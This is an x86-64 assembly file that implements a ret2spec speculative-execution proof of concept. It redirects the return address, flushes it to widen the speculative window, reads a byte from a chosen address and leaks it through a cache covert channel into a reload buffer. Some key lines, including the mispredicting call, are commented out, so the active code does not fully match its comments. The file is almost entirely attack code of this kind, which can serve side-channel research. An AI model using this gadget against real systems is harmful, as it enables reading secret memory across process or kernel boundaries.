.global ret2spec
.global ret2spec_end

.text

rsb_mispredict:
  movq $ret2spec_end, (%rsp)

  // Flush (%rsp) so noticing the wrong return
  // value will take a very long time, giving us
  // a long speculative window
  clflush (%rsp)
  mfence

  ret

// rdi: leak address
// rsi: reload buffer
ret2spec:
  pushq %rbp
  movq %rsp, %rbp

  xor %rax, %rax
  movq $0x00ffffffffffffff, %r8
  movq $0x0000544552434553, %r9

  // This call actually modifies its return pointer to be at
  // ret2spec_end, so the instructions between the call and
  // the ret2spec_end label are never executed (except speculatively)
  //call rsb_mispredict
  
  // Leak the value at (%rdi)
  movb (%rdi), %al

  // Do the mask and subtracting thing to make sure we
  // actually leak the thing
  //andq %r8, %rax
  //subq %r9, %rax
  //ror $48, %rax

  // Covert channel for the leaked value
  // These two instructions are never actually executed, but are speculatively
  // executed. They have a side effect on the cache
  shl $0xc, %eax
  prefetcht0 (%rsi, %rax)
  mov (%rsi, %rax), %r8
  mfence

loop:
  pause
  jmp loop


ret2spec_end:
  movq %rbp, %rsp
  popq %rbp
  ret
  
